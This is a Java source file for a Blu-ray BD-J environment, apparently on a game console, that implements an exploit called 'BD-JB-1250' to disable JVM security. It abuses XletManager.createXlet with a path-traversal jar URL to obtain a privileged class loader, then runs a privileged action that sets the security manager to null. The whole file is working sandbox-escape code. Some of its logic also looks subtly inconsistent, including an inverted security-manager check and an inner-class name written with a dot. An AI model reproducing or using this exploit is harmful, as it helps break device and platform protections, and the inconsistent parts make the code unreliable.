package org.bdj;

import java.awt.Frame;
import java.net.URLClassLoader;
import java.security.AccessController;
import java.security.PrivilegedActionException;
import java.security.PrivilegedExceptionAction;

import javax.tv.xlet.Xlet;
import javax.tv.xlet.XletContext;

import org.havi.ui.HScene;
import org.havi.ui.HSceneFactory;

import com.sun.xlet.XletLifecycleHandler;
import com.sun.xlet.XletManager;

// Class that uses the BD-JB-1250 exploit to disable JVM security when instantiated.
public class DisableSecurity {
	public static final int ENABLED = 0;
	public static final int DISABLED_BY_EXPLOIT = 1;
	public static final int DISABLED_PREVIOUSLY = 2;

	// Whether security is enabled after the constructor runs
	public int status = ENABLED;

	// Exception object, in case security could not be disabled
	public Exception exception = null;

	public DisableSecurity() {
		if (System.getSecurityManager() != null) {
			status = DISABLED_PREVIOUSLY;
			return;
		}
		try {
			// FIXME: Surely this isn't needed?
			// Destroy default HScene
			// HScene hScene = HSceneFactory.getInstance().getDefaultHScene();
			// Frame frame = (Frame) hScene.getParent();
			// hScene.dispose();
			// frame.dispose();

			// Abuse createXlet to create a privileged XletManager
			String stub = "org.bdj.StubXlet";
			String jar = "file:///app0/bdjstack/lib/ext/../../../../disc/BDMV/JAR/00000.jar";
			String[] jars = new String[]{ jar };
			XletLifecycleHandler handler = XletManager.createXlet(stub, jars, new String[0]);
			XletManager manager = (XletManager) handler;

			// Get a privileged ClassLoader from the XletManager
			URLClassLoader cl = (URLClassLoader) manager.getClassLoader();

			// Call the privileged action to disable security
			Class action = cl.loadClass("org.bdj.DisableSecurity.Action");
			action.newInstance();

			// Check that it worked
			if (System.getSecurityManager() != null) {
				throw new Exception("Privileged action didn't disable JVM security");
			}
			status = DISABLED_BY_EXPLOIT;
		} catch (Throwable e) {
			exception = new Exception(e);
		}
	}

	// Privileged action that disables JVM security
	public class Action implements PrivilegedExceptionAction {
		public Action() throws PrivilegedActionException {
			AccessController.doPrivileged(this);
		}
		public Object run() throws Exception {
			System.setSecurityManager(null);
			return null;
		}
	}

	// Stub only required so we have some argument to give to createXlet
	public class StubXlet implements Xlet {
		public void initXlet(XletContext ctx) {}
		public void startXlet() {}
		public void pauseXlet() {}
		public void destroyXlet(boolean unconditional) {}
	}
}
